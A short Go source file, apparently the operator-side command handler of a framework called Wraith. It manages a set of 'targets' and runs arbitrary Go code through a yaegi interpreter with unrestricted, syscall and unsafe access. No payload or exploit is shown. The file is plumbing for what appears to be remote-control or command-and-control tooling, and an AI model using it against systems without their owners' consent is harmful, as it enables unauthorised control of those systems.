package main

import (
	"fmt"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/symbols"
	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/syscall"
	"github.com/traefik/yaegi/stdlib/unrestricted"
	"github.com/traefik/yaegi/stdlib/unsafe"
)

var (
	targetsState map[string]struct{}
)

func addTargets(targets []string) {
	for _, target := range targets {
		targetsState[target] = struct{}{}
	}
}

func removeTargets(targets []string) {
	for _, target := range targets {
		delete(targetsState, target)
	}
}

func setTargets(targets []string) {
	targetsState = make(map[string]struct{})
	for _, target := range targets {
		targetsState[target] = struct{}{}
	}
}

func ExecCmd(ctx lib.CommandContext, command string) (response string, errResponse error) {
	defer func() {
		if p := recover(); p != nil {
			errResponse = fmt.Errorf("command panicked: %v", p)
		}
	}()

	i := interp.New(interp.Options{
		Unrestricted: true,
	})

	i.Use(stdlib.Symbols)
	i.Use(syscall.Symbols)
	i.Use(unsafe.Symbols)
	i.Use(unrestricted.Symbols)
	i.Use(symbols.SymbolsLibwraith)
	i.Use(symbols.SymbolsPc3)
	i.Use(symbols.SymbolsProto)

	i.ImportUsed()

	_, err := i.Eval(command)

	return "", err
}
